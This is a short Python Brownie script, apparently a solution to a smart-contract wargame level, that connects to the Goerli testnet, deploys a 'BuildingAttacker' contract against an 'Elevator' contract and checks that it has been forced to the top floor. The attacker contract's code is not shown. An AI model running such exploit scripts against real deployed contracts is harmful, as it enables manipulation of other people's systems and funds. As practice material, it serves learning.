import brownie

from web3_hacking import config


def main():
    contract_address = "0x61EC539fF8Bcf36909ffF390aDA2a8FEb5e8F264"

    brownie.network.disconnect()
    brownie.network.connect("goerli")

    brownie.accounts.add(config.ETH_ACCOUNT_PRIVATE_KEY)

    elevator = brownie.Elevator.at(contract_address)

    # Deploy Building Attacker contract
    building_attacker = brownie.BuildingAttacker.deploy(
        elevator.address, {"from": brownie.accounts[0]}
    )

    building_attacker.goTo()

    assert elevator.top() is True
